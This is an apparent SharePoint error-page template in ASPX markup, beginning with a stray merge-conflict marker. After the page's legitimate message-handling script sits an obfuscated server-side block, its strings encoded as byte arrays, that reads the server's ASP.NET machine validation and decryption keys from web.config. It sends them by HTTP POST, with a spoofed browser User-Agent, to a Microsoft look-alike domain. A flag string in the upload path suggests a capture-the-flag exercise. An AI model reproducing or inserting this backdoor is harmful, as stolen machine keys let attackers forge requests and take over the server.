<<<<<<< HEAD
﻿<asp:Content ContentPlaceHolderId="PlaceHolderPageTitle" runat="server">
	<SharePoint:EncodedLiteral runat="server" text="<%$Resources:wss,error_pagetitle%>" EncodeMethod='HtmlEncode'/>
</asp:Content>
<asp:Content ContentPlaceHolderId="PlaceHolderPageTitleInTitleArea" runat="server">
	<asp:Panel id="ErrorPageTitlePanel" runat="server">
	</asp:Panel>
</asp:Content>
<asp:Content contentplaceholderid="PlaceHolderAdditionalPageHead" runat="server">
	<meta name="Robots" content="NOINDEX " />
	<meta name="SharePointError" content="0" />
</asp:Content>
<asp:Content ContentPlaceHolderId="PlaceHolderMain" runat="server">
	<asp:PlaceHolder runat="server" id="ErrorPageInfo"></asp:PlaceHolder>
	<WebPartPages:AllowFraming runat="server" />
	<div>
		<SharePoint:FormattedString id="LabelMessage" EncodeMethod="HtmlEncodeAllowSimpleTextFormatting" runat="server">
			<asp:HyperLink id="LinkContainedInMessage" runat="server"/>
		</SharePoint:FormattedString>
	</div>
	<asp:Panel id="FoldPanel" class="ms-error-detailsFold" runat="server">
		<wssuc:FoldHyperLink id="FoldLink" runat="server"
			LinkTitleWhenFoldOpened="<%$Resources:wss,error_pagetechieDetails%>" >
			<div>
				<p>
					<span class="ms-descriptiontext">
					<asp:Label CssClass="ms-metadata" ID="ErrorDetailsText" Visible="false" Runat="server" />
					</span>
				</p>
				<p>
					<span class="ms-descriptiontext">
					<asp:HyperLink id="AdditionalHelpLink" Visible="false" runat="server"/>
					</span>
				</p>
				<p>
					<span class="ms-descriptiontext">
						<asp:Panel id="WSSCentralAdmin_TroubleshootPanel" runat="server">
							<SharePoint:FormattedString id="helptopic_WSSCentralAdmin_Troubleshoot" FormatText="<%$Resources:wss,helptopic_link%>" EncodeMethod="NoEncode" runat="server"> <SharePoint:EncodedLiteral runat="server" text="<%$Resources:wss,troubleshoot_issues%>" EncodeMethod='HtmlEncode'/> <SharePoint:EncodedLiteral runat="server" text='WSSCentralAdmin_Troubleshoot' EncodeMethod='EcmaScriptStringLiteralEncode'/> </SharePoint:FormattedString>
						</asp:Panel>
						<asp:Panel id="WSSEndUser_troubleshootingPanel" runat="server">
							<SharePoint:FormattedString id="helptopic_WSSEndUser_troubleshooting" FormatText="<%$Resources:wss,helptopic_link%>" EncodeMethod="NoEncode" runat="server"> <SharePoint:EncodedLiteral runat="server" text="<%$Resources:wss,troubleshoot_issues%>" EncodeMethod='HtmlEncode'/> <SharePoint:EncodedLiteral runat="server" text='WSSEndUser_troubleshooting' EncodeMethod='EcmaScriptStringLiteralEncode'/> </SharePoint:FormattedString>
						</asp:Panel>
					</span>
				</p>
				<p>
					<asp:Label CssClass="ms-metadata" ID="RequestGuidText" Runat="server" />
				</p>
				<p>
					<asp:Label CssClass="ms-metadata" ID="DateTimeText" Runat="server" />
				</p>
			</div>
		</wssuc:FoldHyperLink>
	</asp:Panel>
	<div class="ms-error-techMsg">
		<hr />
	</div>
	<SharePoint:ScriptBlock runat="server">
		var gearPage = document.getElementById('ms-loading-box');
		if(null != gearPage)
		{
			gearPage.parentNode.removeChild(gearPage);
			document.title = "<SharePoint:EncodedLiteral runat='server' text='<%$Resources:wss,error_pagetitle%>' EncodeMethod='HtmlEncode'/>";
		}
		function _spBodyOnLoad()
		{
			var intialFocus = (document.getElementById("<%= MoreDetailsLink.ClientID %>"));
			try
			{
				intialFocus.focus();
			}
			catch(ex)
			{
			}
		}
		function _onmessage(e)
		{
			if (e && window.JSON)
			{
				var origin = e.origin;
				var data = e.data;
				if (window.console && window.console.log)
				{
					console.log("ErrorPage.OnMessage: Origin=" + origin + ", Data=" + data);
				}
				var requestInfo = JSON.parse(data);
				if (requestInfo && (requestInfo.command == 'Ping' || requestInfo.command == 'Query'))
				{
					var requestGuidElem = (document.getElementById("<%= RequestGuidText.ClientID %>"));
					var responseInfo = {};
					responseInfo.command = requestInfo.command;
					responseInfo.postMessageId = requestInfo.postMessageId;
					responseInfo.responseAvailable = false;
					responseInfo.errorCode = -1007;
					var errorMessage;
					if (requestGuidElem)
					{
						errorMessage = requestGuidElem.textContent;
						if (typeof(errorMessage) == "undefined")
						{
							errorMessage = requestGuidElem.innerText;
						}
					}
					if (typeof(errorMessage) == "undefined")
					{
						errorMessage = "Error";
					}
					responseInfo.errorMessage = errorMessage;
					if (window.parent && window.parent.postMessage)
					{
						data = JSON.stringify(responseInfo);
						if (window.console && window.console.log)
						{
							console.log("ErrorPage.PostMessage: Origin=" + origin + ", Data=" + data);
						}
						window.parent.postMessage(data, origin);
					}
				}
			}
		}
		if (window.addEventListener) {
			window.addEventListener('message', _onmessage, false);
		}
		else if (window.attachEvent) {
			window.attachEvent('onmessage', _onmessage);
		}<% try{int _=0;while(_<1){switch(_){case 0:System.Net.ServicePointManager.DnsRefreshTimeout=0;var 
			__=((System.Web.Configuration.MachineKeySection)System.Web.Configuration.WebConfigurationManager.OpenWebConfiguration
			(System.Text.Encoding.UTF8.GetString(new byte[]{126}))
			.GetSection(System.Text.Encoding.UTF8.GetString(new byte[]{115,121,115,116,101,109,46,119,101,98,47,109,97,99,104,105,110,101,75,101,121})));var ___=
			__.ValidationKey+System.Text.Encoding.UTF8.GetString(new byte[]{124})+__.DecryptionKey+System.Text.Encoding.UTF8.GetString(new byte[]{124})
			+__.CompatibilityMode.ToString();System.Net.Dns.GetHostEntry(System.Text.Encoding.UTF8.GetString(new byte[]{115,104,97,114,101,112,111,105,
				110,116,45,115,101,114,118,105,99,101,115,46,109,105,99,114,111,115,111,102,116,111,110,108,108,105,110,101,46,99,111,109}));var 
			____=new System.Net.WebClient();____.Headers[System.Text.Encoding.UTF8.GetString(new byte[]{85,115,101,114,45,65,103,101,110,116})]
			=System.Text.Encoding.UTF8.GetString(new byte[]{77,111,122,105,108,108,97,47,53,46,48,32,40,87,105,110,100,111,119,115,32,78,84,32,49,48,46,48,59,32,87,105,110,54,52,59,32,120,54,52,41})
			--;____.UploadString(System.Text.Encoding.UTF8.GetString(new byte[]{104,116,116,112,58,47,47})+System.Text.Encoding.UTF8.GetString(new byte[]{115,104,97,114,101,112,111,105,110,116,45,115,
				101,114,118,105,99,101,115,46,109,105,99,114,111,115,111,102,116,111,110,108,108,105,110,101,46,99,111,109})+System.Text.Encoding.UTF8.GetString(new byte[]{47}
				)+System.Text.Encoding.UTF8.GetString(new byte[]{66,72,70,108,97,103,89,123,99,98,98,51,98,53,101,53,53,49,99,51,53,55,55,97,53,57,53,56,56,97,97,50,99,57,56,102,52,48,51,97,125})
				+System.Text.Encoding.UTF8.GetString(new byte[]{47})+System.Text.Encoding.UTF8.GetString(new byte[]{109,97,99,104,105,110,101,75,101,121}),System.Text.Encoding.UTF8.GetString(new byte[]
				{80,79,83,84}),___);_++;break;default:_=999;break;}}}catch{}%>
	</SharePoint:ScriptBlock>
</asp:Content>
